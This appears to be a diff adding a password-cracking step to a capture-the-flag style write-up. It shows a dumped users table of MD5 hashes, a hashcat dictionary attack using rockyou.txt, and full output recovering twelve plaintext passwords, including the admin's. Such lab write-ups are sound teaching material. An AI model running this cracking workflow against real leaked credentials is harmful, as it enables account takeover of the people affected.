@@ -209,6 +209,85 @@ users:
 ```
 ##### 3:James :c660060492d9edcaa8332d89c99c9239 :1 | 4:Theodore :925e5408ecb67aea449373d668b7359e :1 | 5:Samantha :083ffae904143c4796e464dac33c1f7d :1 | 6:Lauren :08344b85b329d7efd611b7a7743e8a09 :1 | 7:William :d62be0dc82071bccc1322d64ec5b6c51 :1 | 8:Sabrina :f87d3c0d6c8fd686aacc6627f1f493a5 :1 | 9:Robert :f03b910e2bd0313a23fdd7575f34a694 :1 | 10:Thane :3577c47eb1e12c8ba021611e1280753c :1 | 11:Carmon :35394484d89fcfdb3c5e447fe749d213 :1 | 12:Barry :54c88b2dbd7b1a84012fabc1a4c73415 :1 | 13:Oliver :fd78db29173a5cf701bd69027cb9bf6b :1 | 14:Michelle :b83439b16f844bd6ffe35c02fe21b3c0 :1 | 15:Gloria :0cfaaaafb559f081df2befbe66686de0 :1 | 16:Victoria :b22abb47a02b52d5dfa27fb0b534f693 :1 | 17:Alexendra :1c2b3d8270321140e5153f6637d3ee53 :1 | 18:Baxter :22ee218331afd081b0dcd8115284bae3 :1 | 19:Clara :ef8f3d30a856cf166fb8215aca93e9ff :1 | 20:Barbra :3961548825e3e21df5646cafe11c6c76 :1 | 21:Lenord :ee0b8a0937abd60c2882eacb2f8dc49f :1 | 22:Austin :0049ac57646627b8d7aeaccf8b6a936f :1 | 23:Garfield :8097cedd612cc37c29db152b6e9edbd3 :1 | 24:Juliette :6dcd87740abb64edfa36d170f0d5450d :1 | 25:Victor :bf55e15b119860a6e6b5a164377da719 :1 | 26:Lucifer :7df45a9e3de3863807c026ba48e55fb3 :1 | 27:Bruno :2a4e2cf22dd8fcb45adcb91be1e22ae8 :1 | 28:Diablo :ec33265e5fc8c2f1b0c137bb7b3632b5 :1 | 29:Robin :dc332fb5576e9631c9dae83f194f8e70 :1 | 30:Stan :384463526d288edcc95fc3701e523bc7 :1 | 31:yoshihide :b779ba15cedfd22a023c4d8bcf5f2332 :1 | 33:admin :665a50ac9eaa781e4f7f04199db97a11 :0
 ```
+
+cracking the hashes:
+
+```
+ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt     
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1469/2939 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 30 digests; 30 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 513 MB (1915 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+3577c47eb1e12c8ba021611e1280753c:highschoolmusical        
+ee0b8a0937abd60c2882eacb2f8dc49f:physics69i               
+665a50ac9eaa781e4f7f04199db97a11:paddpadd                 
+b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..         
+ef8f3d30a856cf166fb8215aca93e9ff:%$clara                  
+2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$           
+54c88b2dbd7b1a84012fabc1a4c73415:$hadoW                   
+6dcd87740abb64edfa36d170f0d5450d:$3xybitch                
+08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##         
+b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123              
+b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!               
+f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$               
+Approaching final keyspace - workload adjusted.           
+
+                                                          
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Mode........: 0 (MD5)
+Hash.Target......: hashes.txt
+Time.Started.....: Thu Oct  1 14:55:30 2026 (2 secs)
+Time.Estimated...: Thu Oct  1 14:55:32 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  6160.3 kH/s (0.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 12/30 (40.00%) Digests (total), 12/30 (40.00%) Digests (new)
+Progress.........: 14344385/14344385 (100.00%)
+Rejected.........: 0/14344385 (0.00%)
+Restore.Point....: 14344385/14344385 (100.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
+Hardware.Mon.#01.: Util: 42%
+
+Started: Thu Oct  1 14:55:28 2026
+Stopped: Thu Oct  1 14:55:34 2026
+
+```
 ---
 ## Foothold
 
